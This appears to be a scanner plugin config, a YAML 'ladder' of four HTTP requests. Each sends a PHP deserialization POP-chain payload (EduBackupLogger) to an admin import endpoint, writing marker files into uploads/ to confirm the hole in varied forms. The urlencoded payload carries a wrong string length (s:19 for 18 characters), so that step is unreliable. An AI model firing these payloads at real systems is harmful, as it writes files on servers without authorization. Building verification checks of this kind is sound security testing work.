# 可执行阶梯 —— rce_deser（导入参数直接反序列化，gadget 写文件）
#
# 依据：plugins/rce_deser/plugin.yaml（endpoint: POST /admin/import, JSON 体, 需 admin 会话）
# 与库内已验证载荷 01/02（同一条 POP 链）；阶梯的价值在于**系统性变化**：换落点文件名、
# 换属性顺序，验证"不是一发运气"。命中只看 marker（VULN_CONFIRMED_D1/D2/DV1/DV2 出现在响应里）。
class: rce_deser
display: 反序列化（导入参数无校验）

baseline:
  param_value: "1"

steps:
  - id: pop_d1_baseline
    kind: request
    value: |
      POST {{TARGET}}/admin/import HTTP/1.1
      Content-Type: application/json
      Cookie: {{SESSION}}

      {"{{IMPORT_PARAM}}":"O:15:\"EduBackupLogger\":2:{s:7:\"logFile\";s:18:\"uploads/lad_a1.txt\";s:3:\"msg\";s:17:\"VULN_CONFIRMED_D1\";}"}
    note: 库内形态的同构变体（落点换成 lad_a1.txt）

  - id: pop_d2_baseline
    kind: request
    value: |
      POST {{TARGET}}/admin/import HTTP/1.1
      Content-Type: application/json
      Cookie: {{SESSION}}

      {"{{IMPORT_PARAM}}":"O:15:\"EduBackupLogger\":2:{s:7:\"logFile\";s:18:\"uploads/lad_a2.txt\";s:3:\"msg\";s:17:\"VULN_CONFIRMED_D2\";}"}
    note: 第二条 POP 链（D2 标记），证明可重复

  - id: pop_reordered_props
    kind: request
    value: |
      POST {{TARGET}}/admin/import HTTP/1.1
      Content-Type: application/json
      Cookie: {{SESSION}}

      {"{{IMPORT_PARAM}}":"O:15:\"EduBackupLogger\":2:{s:3:\"msg\";s:17:\"VULN_CONFIRMED_D1\";s:7:\"logFile\";s:18:\"uploads/lad_a3.txt\";}"}
    note: 属性顺序调换（PHP 反序列化对顺序不敏感）⇒ 同链换形，验证判定不依赖字面量顺序

  - id: pop_plain_urlencoded
    kind: request
    value: |
      POST {{TARGET}}/admin/import HTTP/1.1
      Content-Type: application/x-www-form-urlencoded
      Cookie: {{SESSION}}

      {{IMPORT_PARAM}}=O%3A15%3A%22EduBackupLogger%22%3A2%3A%7Bs%3A7%3A%22logFile%22%3Bs%3A19%3A%22uploads%2Flad_a4.txt%22%3Bs%3A3%3A%22msg%22%3Bs%3A17%3A%22VULN_CONFIRMED_D2%22%3B%7D
    note: 换传输编码（form-urlencoded 而非 JSON）⇒ 看判定是否只认一种形态
